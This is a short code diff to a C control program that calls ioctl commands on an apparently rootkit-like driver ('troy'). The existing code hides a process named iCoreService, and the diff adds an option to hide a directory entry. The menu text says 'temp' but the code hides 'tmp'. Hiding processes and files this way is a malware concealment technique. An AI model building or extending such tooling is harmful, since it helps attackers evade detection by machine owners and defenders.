@@ -38,6 +38,7 @@ void usage()
 {
     printf("***********************\n");
     printf("1. hide process named iCoreService\n");
+    printf("2. hide dirent named \"temp\"");
     printf("0. quit");
     printf("***********************\n");
 }
@@ -73,6 +74,19 @@ int main(int argc, const char * argv[])
                 strcpy(obj.name, name);
                 printf("%p\n", obj.name);
                 ioctl(m_fd, TROY_CMD_HIDE_PROCESS, &obj);
+
+                break;
+            case 2:
+                printf("hide dirent");
+                troy_hide_object obj2;
+                char name2[] = "tmp";
+                obj2.name=(char*)malloc(sizeof(name2));
+                bzero(obj2.name, strlen(name2));
+                strcpy(obj2.name, name2);
+
+                obj2.name_len = strlen(obj2.name);
+                obj2.objec_type=TROY_DIR;
+                ioctl(m_fd, TROY_CMD_HIDE_DIR, &obj2);
 
                 break;
             case 0:
